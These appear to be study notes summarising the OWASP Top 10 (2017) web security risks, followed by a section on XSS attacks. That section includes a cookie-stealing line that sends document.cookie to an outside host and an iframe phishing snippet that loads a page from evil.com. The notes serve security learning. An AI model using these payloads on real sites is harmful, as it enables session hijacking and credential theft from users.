## compare 2013 to 2017 changed
- microservice replace monolithic application, use restful API => no longer trusted caller
- use SPA in JS framework, highly modular code => more client side functionality
- Node.js running server side

# top 10 security risk
## 1. injection
SQL, NoSQL, OS, LDAP injection as part of command/query

## 2. broken authentication
application function related to authentication and session management implemented incorrectly
-> attackers compromise password, keys, session tokens
### prevent
1. generate random session ID, should not be URL
2. limit login 
3. avoid default credential

### attack method
1. use list of known passwords to attack
2. continued use of passwords
3. improper timeout -> not yet logout

## 3. sensitive data exposure
1. no extra protection, eg. encryption
### consideration
- HTTP, SMTP, FTP -> transfer in clear text
- old/weak cryptographic algorithm
- enforced encryption?
### prevent
classify data processed, stored
don't store sentiive data unnecessarily
encrpyt eg. TLS with PFS ciphers, user HSTS
store passwords using salted hashing functions
### attack method
1. SQL injection when retrieve credit card no. in clear text
2. site not enforcing TLS -> downgrade to HTTP, replay cookie
3. db use simple hashes/unsalted to store passwords

## 4. XML external entities
poorly configured XML processor evaluate external entity reference within XML document

## 5. broken access control
restrictions on users not properly enforced
eg. access other users' account, view sensitive files

## 6. security misconfiguration
insecure default configuration, incomplete / ad hoc config, open cloud storage

## 7. cross site scripting

## 8. insecure deserialization
## 9. using components with known vulnerabilities
## 10. insufficient logging & monitoring


# conventional attack
SQL injection, command line attack, upload vulnerablility

# XSS injection
## Cookie hijack
`document.location="http://www.test.com/cookie.asp?cookie="+document.cookie`
script to steal cookie data, store somewhere else
replay attack

## session hijack
session is based on cookie
write XSS to server (eg. leave in comment), when admin login to backend to check comment,
  will trigger XSS loophole
listen to all http package using some tool, get post data

## phishing (網絡釣魚)
1. construct fake form
2. script record down data 
3. XSS phishing expliot
```js
document.body.innerHTML = (
  '<div style="position:absolute; top:0px; left:0px; width:100%; height:100%;">'+
  '<iframe src=http://www.evil.com/>phishing.html width=100% height=100%>'+
  '</iframe></div>'
);
```
### XSS redirect phishing
### XSS html inject phishing
### Iframe phishing
### Flash phishing
upload flash file to server (eg. fake login frame), then use `<object>/<embed>` to reference flash

































